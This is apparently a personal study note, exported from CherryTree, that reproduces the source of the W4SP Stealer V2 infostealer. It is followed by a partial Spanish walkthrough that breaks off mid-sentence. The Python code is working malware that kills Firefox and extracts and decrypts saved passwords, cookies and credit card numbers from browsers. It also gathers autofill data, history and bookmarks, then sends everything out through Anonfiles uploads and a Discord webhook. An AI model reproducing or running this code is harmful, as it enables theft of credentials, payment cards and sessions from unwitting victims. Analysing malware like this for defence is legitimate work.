<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>parte 7</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>parte 7</h1><br/><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">def</span> <span style="color:#729fcf;font-weight:400">FirefoxCookie</span>():<br />    <span style="color:#000000;font-weight:700">try</span>:<br />        <span style="color:#000000;font-weight:700">global</span> Cookies, CookiCount<br />        firefoxpath = f<span style="color:#edd400;font-weight:400">&quot;{roaming}/Mozilla/Firefox/Profiles&quot;</span><br />        <span style="color:#000000;font-weight:700">if</span> <span style="color:#000000;font-weight:700">not</span> os.path.exists(firefoxpath): <span style="color:#000000;font-weight:700">return</span><br />        subprocess.Popen(f<span style="color:#edd400;font-weight:400">&quot;taskkill /im firefox.exe /t /f &gt;nul 2&gt;&amp;1&quot;</span>, shell=<span style="color:#ce5c00;font-weight:400">True</span>)<br />        <span style="color:#000000;font-weight:700">for</span> subdir, dirs, files <span style="color:#000000;font-weight:700">in</span> os.walk(firefoxpath):<br />            <span style="color:#000000;font-weight:700">for</span> file <span style="color:#000000;font-weight:700">in</span> files:<br />               <span style="color:#000000;font-weight:700">if</span> file.endswith(<span style="color:#edd400;font-weight:400">&quot;cookies.sqlite&quot;</span>):<br />                    tempfold = temp + <span style="color:#edd400;font-weight:400">&quot;wp&quot;</span> + <span style="color:#edd400;font-weight:400">&#39;&#39;</span>.join(random.choice(<span style="color:#edd400;font-weight:400">&#39;bcdefghijklmnopqrstuvwxyz&#39;</span>) <span style="color:#000000;font-weight:700">for</span> i <span style="color:#000000;font-weight:700">in</span> <span style="color:#729fcf;font-weight:400">range</span>(<span style="color:#edd400;font-weight:400">8</span>)) + <span style="color:#edd400;font-weight:400">&quot;.db&quot;</span><br />                    shutil.copy2(os.path.join(subdir, file), tempfold)<br />                    conn = sql_connect(tempfold)<br />                    cursor = conn.cursor()<br />                    cursor.execute(<span style="color:#edd400;font-weight:400">&quot;select * from moz_cookies &quot;</span>)<br />                    data = cursor.fetchall()<br />                    cursor.close()<br />                    conn.close()<br />                    os.remove(tempfold)<br />                    <span style="color:#000000;font-weight:700">for</span> row <span style="color:#000000;font-weight:700">in</span> data:<br />                        <span style="color:#000000;font-weight:700">if</span> row[<span style="color:#edd400;font-weight:400">0</span>] != <span style="color:#edd400;font-weight:400">&#39;&#39;</span>:<br />                            Cookies.append(f<span style="color:#edd400;font-weight:400">&quot;H057 K3Y: {row[4]} | N4M3: {row[2]} | V41U3: {row[3]}&quot;</span>)<br />                            CookiCount += <span style="color:#edd400;font-weight:400">1</span><br />    <span style="color:#000000;font-weight:700">except</span>: <span style="color:#000000;font-weight:700">pass</span><br /><br /><span style="color:#000000;font-weight:700">def</span> <span style="color:#729fcf;font-weight:400">getPassw</span>(path, arg):<br />    <span style="color:#000000;font-weight:700">try</span>:<br />        <span style="color:#000000;font-weight:700">global</span> Passw, PasswCount<br />        <span style="color:#000000;font-weight:700">if</span> <span style="color:#000000;font-weight:700">not</span> os.path.exists(path): <span style="color:#000000;font-weight:700">return</span><br /><br />        pathC = path + arg + <span style="color:#edd400;font-weight:400">&quot;/Login Data&quot;</span><br />        <span style="color:#000000;font-weight:700">if</span> os.stat(pathC).st_size == <span style="color:#edd400;font-weight:400">0</span>: <span style="color:#000000;font-weight:700">return</span><br /><br />        tempfold = temp + <span style="color:#edd400;font-weight:400">&quot;wp&quot;</span> + <span style="color:#edd400;font-weight:400">&#39;&#39;</span>.join(random.choice(<span style="color:#edd400;font-weight:400">&#39;bcdefghijklmnopqrstuvwxyz&#39;</span>) <span style="color:#000000;font-weight:700">for</span> i <span style="color:#000000;font-weight:700">in</span> <span style="color:#729fcf;font-weight:400">range</span>(<span style="color:#edd400;font-weight:400">8</span>)) + <span style="color:#edd400;font-weight:400">&quot;.db&quot;</span><br /><br />        data = SqlThing(pathC, tempfold, <span style="color:#edd400;font-weight:400">&quot;SELECT action_url, username_value, password_value FROM logins;&quot;</span>)<br /><br />        pathKey = path + <span style="color:#edd400;font-weight:400">&quot;/Local State&quot;</span><br />        <span style="color:#000000;font-weight:700">with</span> <span style="color:#729fcf;font-weight:400">open</span>(pathKey, <span style="color:#edd400;font-weight:400">&#39;r&#39;</span>, encoding=<span style="color:#edd400;font-weight:400">&#39;utf-8&#39;</span>) <span style="color:#ad7fa8;font-weight:400">as</span> f: local_state = loads(f.read())<br />        master_key = b64decode(local_state[<span style="color:#edd400;font-weight:400">&#39;os_crypt&#39;</span>][<span style="color:#edd400;font-weight:400">&#39;encrypted_key&#39;</span>])<br />        master_key = CryptUnprotectData(master_key[<span style="color:#edd400;font-weight:400">5</span>:])<br /><br />        <span style="color:#000000;font-weight:700">for</span> row <span style="color:#000000;font-weight:700">in</span> data:<br />            <span style="color:#000000;font-weight:700">if</span> row[<span style="color:#edd400;font-weight:400">0</span>] != <span style="color:#edd400;font-weight:400">&#39;&#39;</span>:<br />                <span style="color:#000000;font-weight:700">for</span> wa <span style="color:#000000;font-weight:700">in</span> keyword:<br />                    old = wa<br />                    <span style="color:#000000;font-weight:700">if</span> <span style="color:#edd400;font-weight:400">&quot;https&quot;</span> <span style="color:#000000;font-weight:700">in</span> wa:<br />                        tmp = wa<br />                        wa = tmp.split(<span style="color:#edd400;font-weight:400">&#39;[&#39;</span>)[<span style="color:#edd400;font-weight:400">1</span>].split(<span style="color:#edd400;font-weight:400">&#39;]&#39;</span>)[<span style="color:#edd400;font-weight:400">0</span>]<br />                    <span style="color:#000000;font-weight:700">if</span> wa <span style="color:#000000;font-weight:700">in</span> row[<span style="color:#edd400;font-weight:400">0</span>]:<br />                        <span style="color:#000000;font-weight:700">if</span> <span style="color:#000000;font-weight:700">not</span> old <span style="color:#000000;font-weight:700">in</span> paswWords: paswWords.append(old)<br />                Passw.append(f<span style="color:#edd400;font-weight:400">&quot;UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}&quot;</span>)<br />                PasswCount += <span style="color:#edd400;font-weight:400">1</span><br />        writeforfile(Passw, <span style="color:#edd400;font-weight:400">&#39;passwords&#39;</span>)<br />    <span style="color:#000000;font-weight:700">except</span>:<span style="color:#000000;font-weight:700">pass</span><br /><br /><span style="color:#000000;font-weight:700">def</span> <span style="color:#729fcf;font-weight:400">getCookie</span>(path, arg):<br />    <span style="color:#000000;font-weight:700">try</span>:<br />        <span style="color:#000000;font-weight:700">global</span> Cookies, CookiCount<br />        <span style="color:#000000;font-weight:700">if</span> <span style="color:#000000;font-weight:700">not</span> os.path.exists(path): <span style="color:#000000;font-weight:700">return</span><br /><br />        pathC = path + arg + <span style="color:#edd400;font-weight:400">&quot;/Cookies&quot;</span><br />        <span style="color:#000000;font-weight:700">if</span> os.stat(pathC).st_size == <span style="color:#edd400;font-weight:400">0</span>: <span style="color:#000000;font-weight:700">return</span><br /><br />        tempfold = temp + <span style="color:#edd400;font-weight:400">&quot;wp&quot;</span> + <span style="color:#edd400;font-weight:400">&#39;&#39;</span>.join(random.choice(<span style="color:#edd400;font-weight:400">&#39;bcdefghijklmnopqrstuvwxyz&#39;</span>) <span style="color:#000000;font-weight:700">for</span> i <span style="color:#000000;font-weight:700">in</span> <span style="color:#729fcf;font-weight:400">range</span>(<span style="color:#edd400;font-weight:400">8</span>)) + <span style="color:#edd400;font-weight:400">&quot;.db&quot;</span><br /><br />        data = SqlThing(pathC, tempfold, <span style="color:#edd400;font-weight:400">&quot;SELECT host_key, name, encrypted_value FROM cookies &quot;</span>)<br /><br />        pathKey = path + <span style="color:#edd400;font-weight:400">&quot;/Local State&quot;</span><br /><br />        <span style="color:#000000;font-weight:700">with</span> <span style="color:#729fcf;font-weight:400">open</span>(pathKey, <span style="color:#edd400;font-weight:400">&#39;r&#39;</span>, encoding=<span style="color:#edd400;font-weight:400">&#39;utf-8&#39;</span>) <span style="color:#ad7fa8;font-weight:400">as</span> f: local_state = loads(f.read())<br />        master_key = b64decode(local_state[<span style="color:#edd400;font-weight:400">&#39;os_crypt&#39;</span>][<span style="color:#edd400;font-weight:400">&#39;encrypted_key&#39;</span>])<br />        master_key = CryptUnprotectData(master_key[<span style="color:#edd400;font-weight:400">5</span>:])<br /><br />        <span style="color:#000000;font-weight:700">for</span> row <span style="color:#000000;font-weight:700">in</span> data:<br />            <span style="color:#000000;font-weight:700">if</span> row[<span style="color:#edd400;font-weight:400">0</span>] != <span style="color:#edd400;font-weight:400">&#39;&#39;</span>:<br />                <span style="color:#000000;font-weight:700">for</span> wa <span style="color:#000000;font-weight:700">in</span> keyword:<br />                    old = wa<br />                    <span style="color:#000000;font-weight:700">if</span> <span style="color:#edd400;font-weight:400">&quot;https&quot;</span> <span style="color:#000000;font-weight:700">in</span> wa:<br />                        tmp = wa<br />                        wa = tmp.split(<span style="color:#edd400;font-weight:400">&#39;[&#39;</span>)[<span style="color:#edd400;font-weight:400">1</span>].split(<span style="color:#edd400;font-weight:400">&#39;]&#39;</span>)[<span style="color:#edd400;font-weight:400">0</span>]<br />                    <span style="color:#000000;font-weight:700">if</span> wa <span style="color:#000000;font-weight:700">in</span> row[<span style="color:#edd400;font-weight:400">0</span>]:<br />                        <span style="color:#000000;font-weight:700">if</span> <span style="color:#000000;font-weight:700">not</span> old <span style="color:#000000;font-weight:700">in</span> cookiWords: cookiWords.append(old)<br />                Cookies.append(f<span style="color:#edd400;font-weight:400">&quot;H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}&quot;</span>)<br />                CookiCount += <span style="color:#edd400;font-weight:400">1</span><br />        writeforfile(Cookies, <span style="color:#edd400;font-weight:400">&#39;cookies&#39;</span>)<br />    <span style="color:#000000;font-weight:700">except</span>:<span style="color:#000000;font-weight:700">pass</span><br /><br /><span style="color:#000000;font-weight:700">def</span> <span style="color:#729fcf;font-weight:400">getCCs</span>(path, arg):<br />    <span style="color:#000000;font-weight:700">try</span>:<br />        <span style="color:#000000;font-weight:700">global</span> CCs, CCsCount<br />        <span style="color:#000000;font-weight:700">if</span> <span style="color:#000000;font-weight:700">not</span> os.path.exists(path): <span style="color:#000000;font-weight:700">return</span><br /><br />        pathC = path + arg + <span style="color:#edd400;font-weight:400">&quot;/Web Data&quot;</span><br />        <span style="color:#000000;font-weight:700">if</span> os.stat(pathC).st_size == <span style="color:#edd400;font-weight:400">0</span>: <span style="color:#000000;font-weight:700">return</span><br /><br />        tempfold = temp + <span style="color:#edd400;font-weight:400">&quot;wp&quot;</span> + <span style="color:#edd400;font-weight:400">&#39;&#39;</span>.join(random.choice(<span style="color:#edd400;font-weight:400">&#39;bcdefghijklmnopqrstuvwxyz&#39;</span>) <span style="color:#000000;font-weight:700">for</span> i <span style="color:#000000;font-weight:700">in</span> <span style="color:#729fcf;font-weight:400">range</span>(<span style="color:#edd400;font-weight:400">8</span>)) + <span style="color:#edd400;font-weight:400">&quot;.db&quot;</span><br /><br />        data = SqlThing(pathC, tempfold, <span style="color:#edd400;font-weight:400">&quot;SELECT * FROM credit_cards &quot;</span>)<br /><br />        pathKey = path + <span style="color:#edd400;font-weight:400">&quot;/Local State&quot;</span><br />        <span style="color:#000000;font-weight:700">with</span> <span style="color:#729fcf;font-weight:400">open</span>(pathKey, <span style="color:#edd400;font-weight:400">&#39;r&#39;</span>, encoding=<span style="color:#edd400;font-weight:400">&#39;utf-8&#39;</span>) <span style="color:#ad7fa8;font-weight:400">as</span> f: local_state = loads(f.read())<br />        master_key = b64decode(local_state[<span style="color:#edd400;font-weight:400">&#39;os_crypt&#39;</span>][<span style="color:#edd400;font-weight:400">&#39;encrypted_key&#39;</span>])<br />        master_key = CryptUnprotectData(master_key[<span style="color:#edd400;font-weight:400">5</span>:])<br /><br />        <span style="color:#000000;font-weight:700">for</span> row <span style="color:#000000;font-weight:700">in</span> data:<br />            <span style="color:#000000;font-weight:700">if</span> row[<span style="color:#edd400;font-weight:400">0</span>] != <span style="color:#edd400;font-weight:400">&#39;&#39;</span>:<br />                CCs.append(f<span style="color:#edd400;font-weight:400">&quot;C4RD N4M3: {row[1]} | NUMB3R: {DecryptValue(row[4], master_key)} | EXPIRY: {row[2]}/{row[3]}&quot;</span>)<br />                CCsCount += <span style="color:#edd400;font-weight:400">1</span><br />        writeforfile(CCs, <span style="color:#edd400;font-weight:400">&#39;creditcards&#39;</span>)<br />    <span style="color:#000000;font-weight:700">except</span>:<span style="color:#000000;font-weight:700">pass</span><br /><br /><span style="color:#000000;font-weight:700">def</span> <span style="color:#729fcf;font-weight:400">getAutofill</span>(path, arg):<br />    <span style="color:#000000;font-weight:700">try</span>:<br />        <span style="color:#000000;font-weight:700">global</span> Autofill, AutofillCount<br />        <span style="color:#000000;font-weight:700">if</span> <span style="color:#000000;font-weight:700">not</span> os.path.exists(path): <span style="color:#000000;font-weight:700">return</span><br /><br />        pathC = path + arg + <span style="color:#edd400;font-weight:400">&quot;/Web Data&quot;</span><br />        <span style="color:#000000;font-weight:700">if</span> os.stat(pathC).st_size == <span style="color:#edd400;font-weight:400">0</span>: <span style="color:#000000;font-weight:700">return</span><br /><br />        tempfold = temp + <span style="color:#edd400;font-weight:400">&quot;wp&quot;</span> + <span style="color:#edd400;font-weight:400">&#39;&#39;</span>.join(random.choice(<span style="color:#edd400;font-weight:400">&#39;bcdefghijklmnopqrstuvwxyz&#39;</span>) <span style="color:#000000;font-weight:700">for</span> i <span style="color:#000000;font-weight:700">in</span> <span style="color:#729fcf;font-weight:400">range</span>(<span style="color:#edd400;font-weight:400">8</span>)) + <span style="color:#edd400;font-weight:400">&quot;.db&quot;</span><br /><br />        data = SqlThing(pathC, tempfold,<span style="color:#edd400;font-weight:400">&quot;SELECT * FROM autofill WHERE value NOT NULL&quot;</span>)<br /><br />        <span style="color:#000000;font-weight:700">for</span> row <span style="color:#000000;font-weight:700">in</span> data:<br />            <span style="color:#000000;font-weight:700">if</span> row[<span style="color:#edd400;font-weight:400">0</span>] != <span style="color:#edd400;font-weight:400">&#39;&#39;</span>:<br />                Autofill.append(f<span style="color:#edd400;font-weight:400">&quot;N4M3: {row[0]} | V4LU3: {row[1]}&quot;</span>)<br />                AutofillCount += <span style="color:#edd400;font-weight:400">1</span><br />        writeforfile(Autofill, <span style="color:#edd400;font-weight:400">&#39;autofill&#39;</span>)<br />    <span style="color:#000000;font-weight:700">except</span>:<span style="color:#000000;font-weight:700">pass</span><br /><br /><span style="color:#000000;font-weight:700">def</span> <span style="color:#729fcf;font-weight:400">getHistory</span>(path, arg):<br />    <span style="color:#000000;font-weight:700">try</span>:<br />        <span style="color:#000000;font-weight:700">global</span> History, HistoryCount<br />        <span style="color:#000000;font-weight:700">if</span> <span style="color:#000000;font-weight:700">not</span> os.path.exists(path): <span style="color:#000000;font-weight:700">return</span><br /><br />        pathC = path + arg + <span style="color:#edd400;font-weight:400">&quot;History&quot;</span><br />        <span style="color:#000000;font-weight:700">if</span> os.stat(pathC).st_size == <span style="color:#edd400;font-weight:400">0</span>: <span style="color:#000000;font-weight:700">return</span><br />        tempfold = temp + <span style="color:#edd400;font-weight:400">&quot;wp&quot;</span> + <span style="color:#edd400;font-weight:400">&#39;&#39;</span>.join(random.choice(<span style="color:#edd400;font-weight:400">&#39;bcdefghijklmnopqrstuvwxyz&#39;</span>) <span style="color:#000000;font-weight:700">for</span> i <span style="color:#000000;font-weight:700">in</span> <span style="color:#729fcf;font-weight:400">range</span>(<span style="color:#edd400;font-weight:400">8</span>)) + <span style="color:#edd400;font-weight:400">&quot;.db&quot;</span><br />        data = SqlThing(pathC, tempfold,<span style="color:#edd400;font-weight:400">&quot;SELECT * FROM urls&quot;</span>)<br /><br />        <span style="color:#000000;font-weight:700">for</span> row <span style="color:#000000;font-weight:700">in</span> data:<br />            <span style="color:#000000;font-weight:700">if</span> row[<span style="color:#edd400;font-weight:400">0</span>] != <span style="color:#edd400;font-weight:400">&#39;&#39;</span>:<br />                History.append(row[<span style="color:#edd400;font-weight:400">1</span>])<br />                HistoryCount += <span style="color:#edd400;font-weight:400">1</span><br />        writeforfile(History, <span style="color:#edd400;font-weight:400">&#39;history&#39;</span>)<br />    <span style="color:#000000;font-weight:700">except</span>:<span style="color:#000000;font-weight:700">pass</span><br /><br /><span style="color:#000000;font-weight:700">def</span> <span style="color:#729fcf;font-weight:400">getwebsites</span>(Words):<br />    rb = <span style="color:#edd400;font-weight:400">&#39; | &#39;</span>.join(da <span style="color:#000000;font-weight:700">for</span> da <span style="color:#000000;font-weight:700">in</span> Words)<br />    <span style="color:#000000;font-weight:700">if</span> <span style="color:#729fcf;font-weight:400">len</span>(rb) &gt; <span style="color:#edd400;font-weight:400">1000</span>:<br />        rrrrr = Reformat(<span style="color:#729fcf;font-weight:400">str</span>(Words))<br />        <span style="color:#000000;font-weight:700">return</span> <span style="color:#edd400;font-weight:400">&#39; | &#39;</span>.join(da <span style="color:#000000;font-weight:700">for</span> da <span style="color:#000000;font-weight:700">in</span> rrrrr)<br />    <span style="color:#000000;font-weight:700">else</span>: <span style="color:#000000;font-weight:700">return</span> rb<br /><br /><span style="color:#000000;font-weight:700">def</span> <span style="color:#729fcf;font-weight:400">getBookmarks</span>(path, arg):<br />    <span style="color:#000000;font-weight:700">try</span>:<br />        <span style="color:#000000;font-weight:700">global</span> Bookmarks, BookmarksCount<br />        <span style="color:#000000;font-weight:700">if</span> <span style="color:#000000;font-weight:700">not</span> os.path.exists(path): <span style="color:#000000;font-weight:700">return</span><br /><br />        pathC = path + arg + <span style="color:#edd400;font-weight:400">&quot;Bookmarks&quot;</span><br />        <span style="color:#000000;font-weight:700">if</span> os.path.exists(pathC):<br />            <span style="color:#000000;font-weight:700">with</span> <span style="color:#729fcf;font-weight:400">open</span>(pathC, <span style="color:#edd400;font-weight:400">&#39;r&#39;</span>, encoding=<span style="color:#edd400;font-weight:400">&#39;utf8&#39;</span>) <span style="color:#ad7fa8;font-weight:400">as</span> f:<br />                data = loads(f.read())<br />                <span style="color:#000000;font-weight:700">for</span> i <span style="color:#000000;font-weight:700">in</span> data[<span style="color:#edd400;font-weight:400">&#39;roots&#39;</span>][<span style="color:#edd400;font-weight:400">&#39;bookmark_bar&#39;</span>][<span style="color:#edd400;font-weight:400">&#39;children&#39;</span>]:<br />                    <span style="color:#000000;font-weight:700">try</span>:<br />                        Bookmarks.append(f<span style="color:#edd400;font-weight:400">&quot;N4M3: {i[&#39;name&#39;]} | UR1: {i[&#39;url&#39;]}&quot;</span>)<br />                        BookmarksCount += <span style="color:#edd400;font-weight:400">1</span><br />                    <span style="color:#000000;font-weight:700">except</span>:<span style="color:#000000;font-weight:700">pass</span><br />        <span style="color:#000000;font-weight:700">if</span> os.stat(pathC).st_size == <span style="color:#edd400;font-weight:400">0</span>: <span style="color:#000000;font-weight:700">return</span><br />        writeforfile(Bookmarks, <span style="color:#edd400;font-weight:400">&#39;bookmarks&#39;</span>)<br />    <span style="color:#000000;font-weight:700">except</span>:<span style="color:#000000;font-weight:700">pass</span><br /><br /><span style="color:#000000;font-weight:700">def</span> <span style="color:#729fcf;font-weight:400">parseCookies</span>():<br />    <span style="color:#000000;font-weight:700">try</span>:<br />        tmpCookies = []<br />        <span style="color:#000000;font-weight:700">for</span> cookie <span style="color:#000000;font-weight:700">in</span> Cookies:<br />            <span style="color:#000000;font-weight:700">try</span>:<br />                key =   cookie.split(<span style="color:#edd400;font-weight:400">&#39; | &#39;</span>)[<span style="color:#edd400;font-weight:400">0</span>].split(<span style="color:#edd400;font-weight:400">&#39;: &#39;</span>)[<span style="color:#edd400;font-weight:400">1</span>]<br />                name =  cookie.split(<span style="color:#edd400;font-weight:400">&#39; | &#39;</span>)[<span style="color:#edd400;font-weight:400">1</span>].split(<span style="color:#edd400;font-weight:400">&#39;: &#39;</span>)[<span style="color:#edd400;font-weight:400">1</span>]<br />                value = cookie.split(<span style="color:#edd400;font-weight:400">&#39; | &#39;</span>)[<span style="color:#edd400;font-weight:400">2</span>].split(<span style="color:#edd400;font-weight:400">&#39;: &#39;</span>)[<span style="color:#edd400;font-weight:400">1</span>]<br />                tmpCookies.append(f<span style="color:#edd400;font-weight:400">&quot;{key}\tTRUE\t/\tFALSE\t2597573456\t{name}\t{value}&quot;</span>)<br />            <span style="color:#000000;font-weight:700">except</span>: <span style="color:#000000;font-weight:700">pass</span><br />        writeforfile(tmpCookies, <span style="color:#edd400;font-weight:400">&#39;parsedcookies&#39;</span>)<br />    <span style="color:#000000;font-weight:700">except</span>:<span style="color:#000000;font-weight:700">pass</span><br /><br /><span style="color:#000000;font-weight:700">def</span> <span style="color:#729fcf;font-weight:400">startBthread</span>(func, arg):<br />    <span style="color:#000000;font-weight:700">global</span> Browserthread<br />    t = threading.Thread(target=func, args=arg)<br />    t.start()<br />    Browserthread.append(t)<br /><br /><span style="color:#000000;font-weight:700">def</span> <span style="color:#729fcf;font-weight:400">getBrowsers</span>(browserPaths):<br />    <span style="color:#000000;font-weight:700">global</span> Browserthread<br />    FirefoxCookie()<br />    ThCokk, Browserthread, filess = [], [], []<br />    <span style="color:#000000;font-weight:700">for</span> patt <span style="color:#000000;font-weight:700">in</span> browserPaths:<br />        a = threading.Thread(target=getCookie, args=[patt[<span style="color:#edd400;font-weight:400">0</span>], patt[<span style="color:#edd400;font-weight:400">4</span>]])<br />        a.start()<br />        ThCokk.append(a)<br /><br />        startBthread(getAutofill,       [patt[<span style="color:#edd400;font-weight:400">0</span>], patt[<span style="color:#edd400;font-weight:400">3</span>]])<br />        startBthread(getHistory,        [patt[<span style="color:#edd400;font-weight:400">0</span>], patt[<span style="color:#edd400;font-weight:400">3</span>]])<br />        startBthread(getBookmarks,      [patt[<span style="color:#edd400;font-weight:400">0</span>], patt[<span style="color:#edd400;font-weight:400">3</span>]])<br />        startBthread(getCCs,            [patt[<span style="color:#edd400;font-weight:400">0</span>], patt[<span style="color:#edd400;font-weight:400">3</span>]])<br />        startBthread(getPassw,          [patt[<span style="color:#edd400;font-weight:400">0</span>], patt[<span style="color:#edd400;font-weight:400">3</span>]])<br /><br />    <span style="color:#000000;font-weight:700">for</span> thread <span style="color:#000000;font-weight:700">in</span> ThCokk: thread.join()<br />    <span style="color:#000000;font-weight:700">if</span> Trust(Cookies) == <span style="color:#ce5c00;font-weight:400">True</span>: <span style="color:#729fcf;font-weight:400">__import__</span>(<span style="color:#edd400;font-weight:400">&#39;sys&#39;</span>).exit(<span style="color:#edd400;font-weight:400">0</span>)<br />    parseCookies()<br />    <span style="color:#000000;font-weight:700">for</span> thread <span style="color:#000000;font-weight:700">in</span> Browserthread: thread.join()<br /><br />    <span style="color:#000000;font-weight:700">for</span> file <span style="color:#000000;font-weight:700">in</span> [<span style="color:#edd400;font-weight:400">&quot;wppasswords.txt&quot;</span>, <span style="color:#edd400;font-weight:400">&quot;wpcookies.txt&quot;</span>, <span style="color:#edd400;font-weight:400">&quot;wpcreditcards.txt&quot;</span>, <span style="color:#edd400;font-weight:400">&quot;wpautofill.txt&quot;</span>, <span style="color:#edd400;font-weight:400">&quot;wphistory.txt&quot;</span>, <span style="color:#edd400;font-weight:400">&quot;wpparsedcookies.txt&quot;</span>, <span style="color:#edd400;font-weight:400">&quot;wpbookmarks.txt&quot;</span>]:<br />        filess.append(uploadToAnonfiles(os.getenv(<span style="color:#edd400;font-weight:400">&quot;TEMP&quot;</span>) + <span style="color:#edd400;font-weight:400">&quot;\\&quot;</span> + file))<br />    headers = {<span style="color:#edd400;font-weight:400">&quot;Content-Type&quot;</span>: <span style="color:#edd400;font-weight:400">&quot;application/json&quot;</span>,<span style="color:#edd400;font-weight:400">&quot;User-Agent&quot;</span>: <span style="color:#edd400;font-weight:400">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;</span>}<br /><br />    data = {<br />        <span style="color:#edd400;font-weight:400">&quot;content&quot;</span>: GLINFO,<br />        <span style="color:#edd400;font-weight:400">&quot;embeds&quot;</span>: [<br />            {<br />                <span style="color:#edd400;font-weight:400">&quot;title&quot;</span>: <span style="color:#edd400;font-weight:400">&quot;W4SP | Password Stealer&quot;</span>,<br />                <span style="color:#edd400;font-weight:400">&quot;description&quot;</span>: f<span style="color:#edd400;font-weight:400">&quot;**Found**:\n{getwebsites(paswWords)}\n\n**Data:**\n:key: • **{PasswCount}** Passwords Found\n:link: • [Passwords.txt]({filess[0]})&quot;</span>,<br />                <span style="color:#edd400;font-weight:400">&quot;color&quot;</span>: <span style="color:#edd400;font-weight:400">14406413</span>,<br />                <span style="color:#edd400;font-weight:400">&quot;footer&quot;</span>: {<span style="color:#edd400;font-weight:400">&quot;text&quot;</span>: <span style="color:#edd400;font-weight:400">&quot;@W4SP STEALER V2&quot;</span>,  <span style="color:#edd400;font-weight:400">&quot;icon_url&quot;</span>: <span style="color:#edd400;font-weight:400">&quot;https://cdn.discordapp.com/attachments/1066129000952512552/1069061940363657246/waspv2logo.png&quot;</span>}<br />            },<br />            {<br />                <span style="color:#edd400;font-weight:400">&quot;title&quot;</span>: <span style="color:#edd400;font-weight:400">&quot;W4SP | Cookies Stealer&quot;</span>,<br />                <span style="color:#edd400;font-weight:400">&quot;description&quot;</span>: f<span style="color:#edd400;font-weight:400">&quot;**Found**:\n{getwebsites(cookiWords)}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [Cookies.txt]({filess[1]})\n:link: • [Parsed.txt]({filess[5]})&quot;</span>,<br />                <span style="color:#edd400;font-weight:400">&quot;color&quot;</span>: <span style="color:#edd400;font-weight:400">14406413</span>,<br />                <span style="color:#edd400;font-weight:400">&quot;footer&quot;</span>: {<span style="color:#edd400;font-weight:400">&quot;text&quot;</span>: <span style="color:#edd400;font-weight:400">&quot;@W4SP STEALER V2&quot;</span>,  <span style="color:#edd400;font-weight:400">&quot;icon_url&quot;</span>: <span style="color:#edd400;font-weight:400">&quot;https://cdn.discordapp.com/attachments/1066129000952512552/1069061940363657246/waspv2logo.png&quot;</span>}<br />            },<br />            {<br />                <span style="color:#edd400;font-weight:400">&quot;title&quot;</span>: <span style="color:#edd400;font-weight:400">&quot;W4SP | Other&quot;</span>,<br />                <span style="color:#edd400;font-weight:400">&quot;description&quot;</span>: f<span style="color:#edd400;font-weight:400">&quot;:newspaper: • **{HistoryCount}** Websites Found\n:link: • [history.txt]({filess[4]})\n\n:shield: • **{AutofillCount}** Infos Found\n:link: • [autofill.txt]({filess[3]})\n\n:blue_book: • **{BookmarksCount}** Bookmarks found\n:link: • [bookmarks.txt]({filess[6]})\n\n:credit_card: • **{CCsCount}** Creditcards Found\n:link: • [creditcards.txt]({filess[2]})&quot;</span>,<br />                <span style="color:#edd400;font-weight:400">&quot;color&quot;</span>: <span style="color:#edd400;font-weight:400">14406413</span>,<br />                <span style="color:#edd400;font-weight:400">&quot;footer&quot;</span>: {<span style="color:#edd400;font-weight:400">&quot;text&quot;</span>: <span style="color:#edd400;font-weight:400">&quot;@W4SP STEALER V2&quot;</span>,  <span style="color:#edd400;font-weight:400">&quot;icon_url&quot;</span>: <span style="color:#edd400;font-weight:400">&quot;https://cdn.discordapp.com/attachments/1066129000952512552/1069061940363657246/waspv2logo.png&quot;</span>}<br />            }<br />        ],<br />        <span style="color:#edd400;font-weight:400">&quot;attachments&quot;</span>: []<br />    }<br />    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)<br />    getaccountsinfo()<br />    <span style="color:#000000;font-weight:700">return</span></pre></div></p><p></p><p><h2>Contiene funciones diseñadas para extraer información sensible de navegadores web, particularmente Firefox y otros navegadores compatibles, como Chrome.</h2></p><p><ol><li>1. <strong><h1>1. FirefoxCookie():</h1></strong></li></ol></p><p></p><p><h3>Esta función se encarga de extraer cookies de Firefox.</h3><h3></h3></p><p><h3></h3><ul><li><strong><h3>Ruta de Perfiles de Firefox</h3></strong><h3>: Define la ruta donde se almacenan los perfiles de Firefox.</h3></li><li><strong><h3>Cierre de Firefox</h3></strong><h3>: Usa </h3><code><h3>subprocess.Popen</h3></code><h3> para cerrar el navegador antes de acceder a los archivos de cookies.</h3></li><li><strong><h3>Búsqueda de Archivos</h3></strong><h3>: Recorre el directorio de perfiles en busca de archivos </h3><code><h3>cookies.sqlite</h3></code><h3>.</h3></li><li><strong><h3>Conexión a la Base de Datos</h3></strong><h3>: Copia temporalmente el archivo de cookies a una ubicación en el sistema, luego abre la base de datos y ejecuta una consulta SQL para obtener todas las cookies.</h3></li><li><strong><h3>Almacenamiento</h3></strong><h3>: Añade las cookies a una lista global con información clave como el nombre y el valor de la cookie.</h3></li></ul></p><p><ol><li>2. <strong><h1>2. getPassw(path, arg):</h1></strong></li></ol></p><p></p><p><h3>Esta función extrae contraseñas guardadas en el navegador.</h3><h3></h3></p><p><h3></h3><ul><li><strong><h3>Ruta de Datos de Inicio de Sesión</h3></strong><h3>: Construye la ruta donde se almacenan los datos de inicio de sesión.</h3></li><li><strong><h3>Copia Temporal</h3></strong><h3>: Copia temporalmente el archivo &quot;Login Data&quot; para poder acceder a él.</h3></li><li><strong><h3>Consulta SQL</h3></strong><h3>: Ejecuta una consulta SQL para recuperar la URL, nombre de usuario y contraseña.</h3></li><li><strong><h3>Desencriptado</h3></strong><h3>: Obtiene una clave maestra del archivo &quot;Local State&quot; para desencriptar las contraseñas almacenadas.</h3></li><li><strong><h3>Almacenamiento</h3></strong><h3>: Almacena las contraseñas extraídas en una lista global.</h3></li></ul></p><p><ol><li>3. <strong><h1>3. getCookie(path, arg):</h1></strong></li></ol></p><p></p><p><h3>Extrae las cookies de otros navegadores, similar a 